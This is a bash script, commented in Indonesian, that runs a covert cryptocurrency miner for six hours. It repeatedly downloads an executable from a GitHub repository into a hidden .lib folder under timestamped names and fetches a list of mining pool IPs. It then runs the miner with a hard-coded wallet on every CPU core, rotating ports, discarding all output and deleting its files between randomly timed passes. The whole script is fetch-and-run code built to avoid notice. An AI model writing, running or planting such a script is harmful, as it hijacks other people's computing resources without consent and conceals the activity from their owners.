#!/bin/bash

# Memperbarui dan menginstal dependensi
sudo apt-get update
sudo apt-get install -y wget curl build-essential jq

# Fungsi untuk mengunduh dan memvalidasi file
download_file() {
  local url=$1
  local output=$2
  wget -q -O "$output" "$url"
  if [ ! -f "$output" ]; then
    echo "Gagal mengunduh $url"
    return 1
  fi
  return 0
}

# Mengelola proses dengan waktu acak
run_with_random_delay() {
  local command=$1
  local min_delay=$2
  local max_delay=$3
  local delay=$((RANDOM % (max_delay - min_delay + 1) + min_delay))
  echo "Menunggu selama $delay detik sebelum menjalankan $command"
  sleep $delay
  eval "$command"
}

# Durasi maksimum (6 jam)
end_time=$(( $(date +%s) + 21600 ))

while [ $(date +%s) -lt $end_time ]; do
  timestamp=$(date +%s)
  mkdir -p .lib
  dynamic_sgr=".lib/sgr_$timestamp"

  # Unduh file eksekusi secara acak
  if ! download_file "https://github.com/barburonjilo/back/raw/main/sru" "$dynamic_sgr"; then
    sleep $((RANDOM % 300 + 120))
    continue
  fi
  chmod +x $dynamic_sgr

  # Unduh dan validasi daftar IP
  dynamic_list=".lib/list_$timestamp.json"
  if ! download_file "https://github.com/barburonjilo/setstra/raw/main/list4.json" "$dynamic_list" || ! jq '.' "$dynamic_list" > /dev/null 2>&1; then
    rm -f "$dynamic_sgr" "$dynamic_list"
    sleep $((RANDOM % 300 + 120))
    continue
  fi

  # Pilih IP acak
  ip=$(jq -r '.[]' "$dynamic_list" | shuf -n 1)
  if [ -z "$ip" ]; then
    rm -f "$dynamic_list" "$dynamic_sgr"
    sleep $((RANDOM % 300 + 120))
    continue
  fi

  # Rotasi port dan jalankan proses tanpa log
  for port in $(seq 501 510); do
    command="$dynamic_sgr -a yespowersugar --pool $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr --timeout 90 -t $(nproc)"
    nohup $command > /dev/null 2>&1 &
    process_pid=$!

    echo "Menjalankan proses dengan PID $process_pid pada IP $ip dan port $port"
    sleep $((RANDOM % 60 + 30))
    kill $process_pid || true
  done

  # Bersihkan file sementara
  rm -f "$dynamic_list" "$dynamic_sgr"

  # Tidur acak sebelum iterasi berikutnya
  sleep $((RANDOM % 300 + 120))
done
